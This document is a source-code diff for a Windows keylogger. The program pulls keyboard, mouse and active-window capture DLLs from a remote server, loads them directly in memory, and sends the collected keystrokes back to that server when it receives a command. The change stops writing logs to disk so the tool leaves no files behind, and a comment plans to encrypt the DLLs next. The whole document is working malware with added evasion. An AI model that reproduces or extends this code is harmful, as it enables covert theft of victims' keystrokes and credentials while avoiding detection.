@@ -9,53 +9,49 @@
     !! will need the  network_lib.dll and others in the same directory as the executable   !!
 
     make the malicious dlls to load from memory [done]
+    now no files are written to the disk
     use encrypted dlls next
 */
 
 #include <windows.h>
 #include <iostream>
 #include <string>
-#include <fstream>
 #include <sstream>
 #include <mutex>
 #include <vector>
 #include "MemoryModule.h"
 
-using namespace std;
-
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 LPCSTR dllPath_n = "network_lib.dll";
-
 HMEMORYMODULE hDLL_k, hDLL_m, hDLL_w;
 HINSTANCE hDLL_n;
 
 //------------------------------------------------------------------------------------------------------------------------------
 
 typedef int (*SendDataFunc)(const std::string&, const std::string&);
-typedef string (*RecvDataFunc)(const std::string&);
-typedef vector<unsigned char> (*RecvDataRawFunc)(const std::string&);
+typedef std::string (*RecvDataFunc)(const std::string&);
+typedef std::vector<unsigned char> (*RecvDataRawFunc)(const std::string&);
 SendDataFunc send_data;
 RecvDataFunc receive_data;
 RecvDataRawFunc receive_data_raw;
 
 //==============================================================================================================================
 
-typedef void(*CleanupFunc)(const std::string&);
-typedef void(*InitializeFunc)(const std::string&);
-InitializeFunc initialize_keyboard, initialize_mouse, initialize_active_window;
-CleanupFunc cleanup_keyboard, cleanup_mouse, cleanup_active_window;
+typedef void(*InitializeFunc)(std::vector<std::string>*);
+typedef void(*CleanupFunc)();
+InitializeFunc initialize_active_window, initialize_mouse, initialize_keyboard;
+CleanupFunc cleanup_active_window, cleanup_mouse, cleanup_keyboard;
 
 //------------------------------------------------------------------------------------------------------------------------------
 
 bool running = true;
-std::ofstream outputFile("keystrokes.txt", std::ios::app);
+std::vector<std::string> shared_vector;
 
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 int load_dlls();
 BOOL CtrlHandler(DWORD fdwCtrlType);
-std::string readFile(const std::string& filename);
 
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
@@ -74,31 +70,28 @@ int main(int argc, char* argv[])
     }
 
 
-    initialize_active_window("keystrokes.txt");
-    initialize_keyboard("keystrokes.txt");
-    initialize_mouse("keystrokes.txt");
+    initialize_active_window(&shared_vector);
+    initialize_keyboard(&shared_vector);
+    initialize_mouse(&shared_vector);
 
 
     std::thread terminationCheckThread([&]()
     {
         while (true)
         {
-            string a = receive_data("klogger_cmd.txt");
+            std::string a = receive_data("klogger_cmd.txt");
             if (a[0] == 's')
             {
                 receivedTerminationSignal = true;
                 send_data("klogger_cmd.txt","`");
 
-                string contents = readFile("keystrokes.txt");
-                send_data("key_strokes.txt",contents);
+                std::ostringstream oss;
+                for (const auto& entry : shared_vector) oss << entry;
+                send_data("key_strokes.txt",oss.str());
 
-                
-                cleanup_keyboard("keystrokes.txt");
-                cleanup_mouse("keystrokes.txt");
-                cleanup_active_window("keystrokes.txt");
-                outputFile.close();
-                remove("keystrokes.txt");
-
+                cleanup_keyboard();
+                cleanup_mouse();
+                cleanup_active_window();
                 break; 
             }
             std::this_thread::sleep_for(std::chrono::milliseconds(100)); 
@@ -126,21 +119,6 @@ int main(int argc, char* argv[])
     return 0;
 }
 
-std::string readFile(const std::string& filename)           // needed to read the keystrokes file soo can send it to the server
-{
-  std::ifstream file(filename);
-  if (!file.is_open())
-  {
-    std::cerr << "Error: Could not open file '" << filename << "'" << std::endl;
-    return ""; 
-  }
-
-  std::stringstream buffer;
-  buffer << file.rdbuf(); 
-
-  return buffer.str();
-}
-
 int load_dlls()                                             // loads the dlls from the disk
 {
     hDLL_n = LoadLibraryA(dllPath_n);
@@ -162,7 +140,7 @@ int load_dlls()                                             // loads the dlls fr
 
     //------------------------------------------------------------------------------------------------------------------------------
 
-    vector<unsigned char> dll_k, dll_m, dll_w;
+    std::vector<unsigned char> dll_k, dll_m, dll_w;
 
     dll_k = receive_data_raw("keylog_k_lib.dll");
     dll_m = receive_data_raw("keylog_m_lib.dll");
@@ -177,8 +155,8 @@ int load_dlls()                                             // loads the dlls fr
         return 1;
     }
 
-    initialize_keyboard = (InitializeFunc)MemoryGetProcAddress(hDLL_k, "?Initialize@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
-    cleanup_keyboard = (CleanupFunc)MemoryGetProcAddress(hDLL_k, "?Cleanup@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
+    initialize_keyboard = (InitializeFunc)MemoryGetProcAddress(hDLL_k, "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
+    cleanup_keyboard = (CleanupFunc)MemoryGetProcAddress(hDLL_k, "?Cleanup@@YAXXZ");
     if (!initialize_keyboard || !cleanup_keyboard)
     {
         std::cerr << "Failed to get one or more function addresses for keyboard dll.\n";
@@ -195,8 +173,8 @@ int load_dlls()                                             // loads the dlls fr
         return 1;
     }
 
-    initialize_mouse = (InitializeFunc)MemoryGetProcAddress(hDLL_m, "?Initialize@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
-    cleanup_mouse = (CleanupFunc)MemoryGetProcAddress(hDLL_m, "?Cleanup@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
+    initialize_mouse = (InitializeFunc)MemoryGetProcAddress(hDLL_m, "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
+    cleanup_mouse = (CleanupFunc)MemoryGetProcAddress(hDLL_m, "?Cleanup@@YAXXZ");
     if (!initialize_mouse || !cleanup_mouse)
     {
         std::cerr << "Failed to get one or more function addresses for mouse dll.\n";
@@ -213,8 +191,8 @@ int load_dlls()                                             // loads the dlls fr
         return 1;
     }
 
-    initialize_active_window = (InitializeFunc)MemoryGetProcAddress(hDLL_w, "?Initialize@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
-    cleanup_active_window = (CleanupFunc)MemoryGetProcAddress(hDLL_w, "?Cleanup@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
+    initialize_active_window = (InitializeFunc)MemoryGetProcAddress(hDLL_w, "?Initialize@@YAXPEAV?$vector@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V?$allocator@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@@Z");
+    cleanup_active_window = (CleanupFunc)MemoryGetProcAddress(hDLL_w, "?Cleanup@@YAXXZ");
     if (!initialize_active_window || !cleanup_active_window)
     {
         std::cerr << "Failed to get one or more function addresses for initialize_active_window dll.\n";
@@ -239,10 +217,9 @@ BOOL CtrlHandler(DWORD fdwCtrlType)
             
             running = false;
             
-            cleanup_keyboard("keystrokes.txt");
-            cleanup_mouse("keystrokes.txt");
-            cleanup_active_window("keystrokes.txt");
-            outputFile.close();
+            cleanup_keyboard();
+            cleanup_mouse();
+            cleanup_active_window();
 
             FreeLibrary(hDLL_n);
 
